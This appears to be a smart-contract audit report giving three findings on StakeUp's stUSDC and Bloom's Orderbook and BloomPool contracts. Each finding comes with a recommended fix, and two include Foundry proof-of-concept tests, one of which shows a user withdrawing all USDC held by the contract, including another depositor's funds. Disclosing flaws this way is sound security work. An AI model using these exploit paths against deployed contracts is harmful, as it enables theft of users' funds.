# (HIGH) Artificial inflation of total USD value due to repeated `_setUsdPerShare` calls with the same rate

In StakeUp's protocol, the rate of USDC per share of stUSDC is updated in the internal [`_setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function of the [`StUsdcLite.sol`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol) contract. This function can be called both from the external [`setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function, which only the protocol's keeper can trigger, and from the permissionless external [`poke`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function, which resides in the [`StUsdc.sol`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol) contract. Apart from updating the USDC per share rate, the [`_setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function is also responsible for updating the total USD value held by the system, which occurs inside the internal [`_totalUsd`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function of the [`StUsdcLite.sol`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol).

If the [`_setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function is called multiple times with the same rate, and with [`_rewardPerSecond`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) already set, the total USD value will be artificially inflated, enabling users to withdraw more assets than they actually hold.

## Context

- [`StUsdcLite.sol#L92-L109`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109)

## Impact

The total USD value held by the system will be artificially inflated, enabling users to withdraw more assets than their actual holdings.

## Proof of Concept

This issue occurs when the USD per share is updated repeatedly with the same rate, with [`_rewardPerSecond`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) holding a non-zero value, through the [`_setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) function. Here's a snippet of the [`_setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L92-L109) code:

```solidity
 92:    function _setUsdPerShare(uint256 usdPerShare, uint256 timestamp) internal {
 93:        // solidify the yield from the last 24 hours (stored as floor which will be used to update totalUsdFloor)
 94:        uint256 floor = _totalUsd();
 95:        _lastRateUpdate = timestamp;
 96:
 97:        uint256 lastUsdPerShare_ = _lastUsdPerShare;
 98:        if (usdPerShare > lastUsdPerShare_) {
 99:            uint256 yieldPerShare = usdPerShare - lastUsdPerShare_;
100:            _rewardPerSecond = yieldPerShare.divWad(Constants.ONE_DAY);
101:        } else if (usdPerShare < lastUsdPerShare_) {
102:            _rewardPerSecond = 0;
103:            floor = usdPerShare.mulWad(_totalShares);
104:        }
105:
106:        _setTotalUsdFloor(floor);
107:        _lastUsdPerShare = usdPerShare;
108:        emit UpdatedUsdPerShare(usdPerShare);
109:    }
```

As seen, the [`_rewardPerSecond`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is not reset to zero when `usdPerShare == lastUsdPerShare_`. As a result, the total USD is artificially inflated each time the floor value is retrieved by the [`_totalUsd`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function. The total USD value is also updated at line 106. Here's a snippet of the [`_totalUsd`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) function:

```solidity
74:     function _totalUsd() internal view returns (uint256) {
75:         uint256 timeElapsed = block.timestamp - _lastRateUpdate;
76:         uint256 yieldPerShare = timeElapsed >= Constants.ONE_DAY
77:             ? (_rewardPerSecond.mulWad(Constants.ONE_DAY))
78:             : (_rewardPerSecond.mulWad(timeElapsed));
79:         uint256 yield = yieldPerShare.mulWad(_totalShares);
80:         return _totalUsdFloor + yield;
81:     }
```

The above function computes the total USD value held by the system, yield included. Since [`_rewardPerSecond`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is not reset, the value returned by the [`totalUsd`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L74-L81) will inflate over time, even though the USD per share remains the same.

This artificial inflation enables users to withdraw more assets than they hold. To demonstrate this, two Proofs of Concept are shown: one using the [`setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function and the other using the [`poke`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function.

Here's a complete Proof of Concept using the [`setUsdPerShare`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L53-L55) function:

```solidity
function test_inflationBugThroughKeeper() public {
    // ************************ SETUP ************************
    // `alice` and `bob` deposit 1,000 USDC each
    uint256 depositAssetAmount = 1_000e6;
    _depositAsset(alice, depositAssetAmount);
    _depositAsset(bob, depositAssetAmount);
    assertEq(stUsdc.balanceOf(alice), depositAssetAmount * 1e12);
    assertEq(stUsdc.balanceOf(bob), depositAssetAmount * 1e12);

    // `borrower` match the order of the stUSDC contract
    uint256 matchAmount = 2 * depositAssetAmount;
    uint256 totalCollateral = _matchBloomOrder(address(stUsdc), matchAmount);
    vm.stopPrank();
    assertEq(bloomPool.matchedDepth(), matchAmount);

    // TBY starts its maturity period
    uint256 tbyId = _bloomStartNewTby(totalCollateral);
    vm.stopPrank();
    assertEq(tby.balanceOf(address(stUsdc), tbyId), matchAmount);

    // *********************** ACTION ************************
    // Simulation of price change over time
    address keeper_ = address(stUsdc.keeper());
    for (uint256 i; i < 5; ++i) {
        _skipAndUpdatePrice(1 days, 220e8, uint80(i));

        vm.prank(keeper_);
        stUsdc.setUsdPerShare(2e18, block.timestamp);
    }

    // ************************ TEST *************************
    // Asserting that `alice`'s stUSDC balance has been artificially inflated
    uint256 aliceStUsdcBalance = stUsdc.balanceOf(alice);
    assertGt(aliceStUsdcBalance, 4 * (depositAssetAmount * 1e12));
    console.log("ALICE stUSDC BALANCE   :", aliceStUsdcBalance);

    // Asserting that `bob`'s stUSDC balance has been artificially inflated
    uint256 bobStUsdcBalance = stUsdc.balanceOf(bob);
    assertGt(bobStUsdcBalance, 4 * (depositAssetAmount * 1e12));
    console.log("BOB stUSDC BALANCE     :", bobStUsdcBalance);
}
```

Logs:
```
ALICE stUSDC BALANCE   : 4999999999999999996000
BOB stUSDC BALANCE     : 4999999999999999996000
```

Here's a complete Proof of Concept using the [`poke`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdc.sol#L164-L216) function:

```solidity
function test_inflationBugThroughPoke() public {
    // ************************ SETUP ************************
    // `alice` and `bob` deposit 1,000 USDC each
    uint256 depositAssetAmount = 1_000e6;
    _depositAsset(alice, depositAssetAmount);
    _depositAsset(bob, depositAssetAmount);
    assertEq(stUsdc.balanceOf(alice), depositAssetAmount * 1e12);
    assertEq(stUsdc.balanceOf(bob), depositAssetAmount * 1e12);

    // `borrower` match the order of the stUSDC contract
    uint256 matchAmount = 2 * depositAssetAmount;
    uint256 totalCollateral = _matchBloomOrder(address(stUsdc), matchAmount);
    vm.stopPrank();
    assertEq(bloomPool.matchedDepth(), matchAmount);

    // TBY starts its maturity period
    uint256 tbyId = _bloomStartNewTby(totalCollateral);
    vm.stopPrank();
    assertEq(tby.balanceOf(address(stUsdc), tbyId), matchAmount);

    // Simulation of price change over time until TBY's maturity is reached
    uint256 newPrice;
    for (uint256 i; i < 180; ++i) {
        if (i < 45) {
            newPrice = 110e8;
        } else if (i < 90) {
            newPrice = 250e8;
        } else if (i < 170) {
            newPrice = 175e8;
        } else {
            newPrice = 220e8;
        }

        vm.prank(rando);
        stUsdc.poke(_generateSettings(address(0)));

        _skipAndUpdatePrice(1 days, newPrice, uint80(i));
    }

    // Turning TBY redeemable
    _bloomEndTby(tbyId, 2 * totalCollateral);
    vm.stopPrank();
    assertTrue(bloomPool.isTbyRedeemable(tbyId));

    // Redemption of TBY
    vm.prank(rando);
    stUsdc.poke(_generateSettings(address(0)));
    assertEq(tby.balanceOf(address(stUsdc), tbyId), 0);

    // *********************** ACTION ************************
    // `alice` withdraws all USDC held in stUSDC contract (`bob`'s balance included)
    uint256 stUsdcBalance = stableToken.balanceOf(address(stUsdc));
    vm.startPrank(alice);
    stUsdc.redeemStUsdc(stUsdcBalance * 1e12);

    // ************************ TEST *************************
    // Asserting that `alice` withdraws all USDC from stUSDC contract
    uint256 aliceUsdcBalance = stableToken.balanceOf(alice);
    assertEq(aliceUsdcBalance, stUsdcBalance);
    console.log("ALICE USDC BALANCE     :", aliceUsdcBalance);

    // Asserting that the stUSDC contract no longer holds any USDC
    stUsdcBalance = stableToken.balanceOf(address(stUsdc));
    assertEq(stUsdcBalance, 0);
    console.log("stUSDC USDC BALANCE    :", stUsdcBalance);

    // Asserting that `bob` cannot get his USDC back
    vm.expectRevert(Errors.InsufficientBalance.selector);
    vm.startPrank(bob);
    stUsdc.redeemStUsdc(10e18);
    console.log("BOB USDC BALANCE       :", stableToken.balanceOf(bob));
}
```

Logs:
```
ALICE USDC BALANCE     : 3990000000
stUSDC USDC BALANCE    : 0
BOB USDC BALANCE       : 0
```

## Recommendation

Consider changing the else if condition at line 101 of the [`StUsdcLite.sol`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol) contract as follows:

```solidity
101: (-)  else if (usdPerShare < lastUsdPerShare_)
101: (+)  else if (usdPerShare <= lastUsdPerShare_)
```

This will ensure that [`_rewardPerSecond`](https://github.com/stakeup-protocol/stakeup-contracts/blob/67a5e7bbd019c745239f9d5da10208da57dc1c64/src/token/StUsdcLite.sol#L28) is reset to zero if the USD per share is updated with the same rate.

# (HIGH) Partial match order cancellation may cause fund loss for lenders and borrowers

In Bloom's protocol, lenders can cancel their match orders through the [`killMatchOrder`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L109-L115) function, which resides in the [`Orderbook.sol`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol) contract. This function loops through all the lender's match orders in a LIFO manner, attempting to cancel orders until the desired amount has been removed. However, if half of a match order is canceled, the remaining portion is lost because the order is removed from the list of match orders. This occurs because line 266 compares the remaining lender's collateral with the amount to be removed, which, in this case, are equal. Since these two values match, the match order is removed from the list, causing the remaining funds to be lost.

## Context

- [`Orderbook.sol#L266`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L266)

## Impact

Lenders and borrowers will lose funds whenever half of a match order is canceled.

## Proof of Concept

Let's break it down step by step to understand why this happens.

Alice, a lender, opens a lending order for 1,000 USDC.

Joe, a whitelisted borrower, decides to fulfill Alice's position.

For whatever reason, Alice decides to cancel 500 USDC and triggers the [`killMatchOrder`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L109-L115) function, where the problem begins. The [`killMatchOrder`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L109-L115) function calls the internal [`_closeMatchOrders`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L239-L273) function to loop through Alice's match orders and cancel them. In this case, Alice has only one match order, previously matched by Joe.

Let's examine the [`_closeMatchOrders`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/Orderbook.sol#L239-L273) function:

1. The function first retrieves all of Alice's match orders and defines a variable to hold the remaining amount to be canceled:

```solidity
240:    MatchOrder[] storage matches = _userMatchedOrders[account];
241:    uint256 remainingAmount = amount;
```

2. Next, it loops through the list of match orders. Since Alice only has one match order, it checks if this order is already closed by verifying if the lender's collateral is 0, which is not our case:

```solidity
248:    if (matches[index].lCollateral == 0) {
249:        matches.pop();
250:        continue;
251:    }
```

3. If there is still a remaining amount to be canceled, the function updates the state accordingly, adjusting collaterals and idle capital:

```solidity
253:    if (remainingAmount != 0) {
254:        uint256 amountToRemove = Math.min(remainingAmount, matches[index].lCollateral);
255:        uint256 borrowAmount = uint256(matches[index].bCollateral);
256:
257:        if (amountToRemove != matches[index].lCollateral) {
258:            borrowAmount = amountToRemove.divWad(_leverage);
259:            matches[index].lCollateral -= uint128(amountToRemove);
260:            matches[index].bCollateral -= uint128(borrowAmount);
261:        }
262:        remainingAmount -= amountToRemove;
263:        _idleCapital[matches[index].borrower] += borrowAmount;
264:
265:        emit MatchOrderKilled(account, matches[index].borrower, amountToRemove);
266:        if (matches[index].lCollateral == amountToRemove) matches.pop();
267:    }
```

The issue occurs on line 266, where the remaining lender collateral is compared with the amount to be removed. Since the lender collateral is updated, on line 259, to 500 USDC (the same as the amount Alice wants to remove), the match order is removed from the list, resulting in both the lender and borrower losing the remaining funds.

Here's a complete Proof of Concept:

```solidity
function test_lostFundsByKillingHalfMatchOrder() public {
    // ************************ SETUP ************************
    // `owner` sets `borrower` as a whitelisted borrower
    vm.prank(owner);
    bloomPool.whitelistBorrower(borrower, true);

    // `alice` lends 1,000 USDC
    uint256 lendAmount = 1_000e6;
    _createLendOrder(alice, lendAmount);
    assertEq(bloomPool.amountOpen(alice), lendAmount);

    // `borrower` fulfills `alice`'s order
    uint256 borrowAmount = _fillOrder(alice, lendAmount);
    assertEq(bloomPool.amountOpen(alice), 0);
    assertEq(bloomPool.matchedDepth(), lendAmount);

    // *********************** ACTION ************************
    // `alice` withdraws 500 USDC
    uint256 halfAmount = lendAmount / 2;
    vm.prank(alice);
    uint256 totalRemoved = bloomPool.killMatchOrder(halfAmount);
    assertEq(totalRemoved, halfAmount);
    assertEq(bloomPool.matchedDepth(), halfAmount);

    // ************************ TEST *************************
    // Asserting that `alice` has no match orders, despite having killed only half of a match order
    uint256 aliceMatchOrderCount = bloomPool.matchedOrderCount(alice);
    assertEq(aliceMatchOrderCount, 0);
    console.log("ALICE MATCH ORDER COUNT    :", aliceMatchOrderCount);

    // Asserting that `alice` has no open orders
    uint256 aliceAmountOpen = bloomPool.amountOpen(alice);
    assertEq(aliceAmountOpen, 0);
    console.log("ALICE AMOUNT OPEN          :", aliceAmountOpen);

    // Asserting that `alice` now only has half of her initial balance
    uint256 aliceUsdcBalance = stable.balanceOf(alice);
    assertEq(aliceUsdcBalance, halfAmount);
    console.log("ALICE USDC BALANCE         :", aliceUsdcBalance);

    // Asserting that `borrower` only has half of their initial balance in the form of idle capital
    uint256 borrowerIdleCapital = bloomPool.idleCapital(borrower);
    assertEq(borrowerIdleCapital, borrowAmount / 2);
    console.log("BORROWER IDLE CAPITAL      :", borrowerIdleCapital);
}
```

Logs:
```
ALICE MATCH ORDER COUNT    : 0
ALICE AMOUNT OPEN          : 0
ALICE USDC BALANCE         : 500000000
BORROWER IDLE CAPITAL      : 10000000
```

It is **important** to note that this is not the only scenario that triggers the issue. For instance, if Alice had two match orders of 500 USDC each, and she wanted to withdraw 750 USDC, the second order would be affected similarly. There are multiple combinations beyond the example of withdrawing half of a position.

## Recommendation

Consider changing the condition on line 266 as follows:

```solidity
266: (-)    if (matches[index].lCollateral == amountToRemove) matches.pop();
266: (+)    if (matches[index].lCollateral == 0) matches.pop();
```

This change guarantees that a match order is removed only when there is no longer any collateral from the lender.

# (MEDIUM) LIFO conversion of match orders into live orders could lead to borrower DoS and race to kill orders

In Bloom's protocol, match orders are converted into live orders whenever a market maker swaps in RWA for USDC by triggering the [`swapIn`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/BloomPool.sol#L159-L193) function, which resides in the [`BloomPool.sol`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/BloomPool.sol) contract. This conversion occurs inside the internal [`_convertMatchOrders`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/BloomPool.sol#L378-L423) function of the [`BloomPool.sol`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/BloomPool.sol) contract and is done in a LIFO manner. This means that the older match orders will be the last ones to be converted, which is unfair for borrowers. As a result, borrowers could face an unfair temporary DoS.

## Context

- [`BloomPool.sol#L384-L414`](https://github.com/Blueberryfi/bloom-v2/blob/3e1efbfcad8cb14303d3b17382a5ae1ae52feaa8/src/BloomPool.sol#L384-L414)

## Impact

Borrowers could experience a DoS due to how match orders are converted in a LIFO manner. Therefore, this can trigger a race to be the first in the list, thus incentivizing borrowers to kill their match orders, which is not capital efficient. Additionally, this poor user experience could hinder onboarding new users.

## Proof of Concept

Let's imagine that Alice, a lender, has the following list of match orders, where the first one (`m1`) was matched by Bob, a whitelisted borrower of the protocol:

- List of Alice's match orders: `[m1, m2, m3, m4, m5, m6]`

As previously mentioned, the conversion of match orders into live ones happens in a LIFO manner, meaning that the first one to be converted is `m6`.

With that said, a market maker converts `m6` and `m5` into live orders, making Bob's order closer to being converted. However, new borrowers come along and match some more of Alice's position, appending, for example, three more match orders to the list (`m7`, `m8`, `m9`):

- List of Alice's match orders: `[m1, m2, m3, m4, m7, m8, m9]`

As a result, Bob is incentivized to kill his match order and re-match it again so that he can see his order converted more quickly.

Another alternative for Bob would be to wait an undetermined amount of time until his order is converted, which is unfair since Bob was the first borrower to create a match order.

## Recommendation

Consider converting match orders into live orders in a FIFO manner instead of LIFO, improving fairness in the process and mitigating the need to race to kill orders.
